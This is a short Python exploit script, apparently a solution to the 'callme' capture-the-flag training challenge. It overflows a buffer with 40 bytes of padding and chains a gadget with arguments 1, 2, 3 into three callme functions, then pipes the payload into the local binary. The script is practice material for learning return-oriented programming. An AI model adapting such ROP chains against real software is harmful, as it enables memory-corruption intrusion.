#!/usr/bin/python
import struct
import os


def p64(addr):
	return struct.pack("<Q",addr)

callme_one = p64(0x0000000000401850)
callme_two = p64(0x0000000000401870)
callme_three = p64(0x0000000000401810)

p1 = p64(0x1)
p2 = p64(0x2)
p3 = p64(0x3)

garbage = "A"* 40

gadget = p64(0x0000000000401ab0)


exploit = garbage + gadget + p1+p2+p3 +callme_one + gadget + p1+p2+p3 + callme_two + gadget + p1+p2+p3 + callme_three

with open("simple_exploit.txt","w") as f:
	f.write(exploit)
	f.close()

os.system("cat simple_exploit.txt|./callme")
